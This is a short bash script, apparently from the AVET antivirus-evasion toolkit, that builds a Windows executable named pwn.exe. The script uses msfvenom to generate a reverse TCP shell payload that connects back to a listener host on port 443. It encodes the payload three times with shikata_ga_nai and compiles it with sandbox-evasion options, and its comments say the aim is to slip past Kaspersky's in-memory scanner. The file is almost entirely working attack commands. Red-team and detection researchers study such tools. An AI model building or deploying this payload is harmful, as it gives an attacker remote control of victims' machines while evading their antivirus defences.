#!/bin/bash          
# this is for kaspersky, since meterpreter is recognized by in memory scanner
# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh
# make shell tcp reverse payload, encoded with shikata_ga_nai
# additionaly to the avet encoder, further encoding should be used
msfvenom -p windows/shell/reverse_tcp lhost=192.168.116.128 lport=443 -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
# format the shellcode for make_avet
./format.sh sc.txt > scclean.txt && rm sc.txt
# call make_avet, the -f compiles the shellcode to the exe file, the -F is for the AV sandbox evasion 
./make_avet -f scclean.txt -F -E
# compile to pwn.exe file
$win32_compiler -o pwn.exe avet.c
# cleanup
rm scclean.txt && echo "" > defs.h
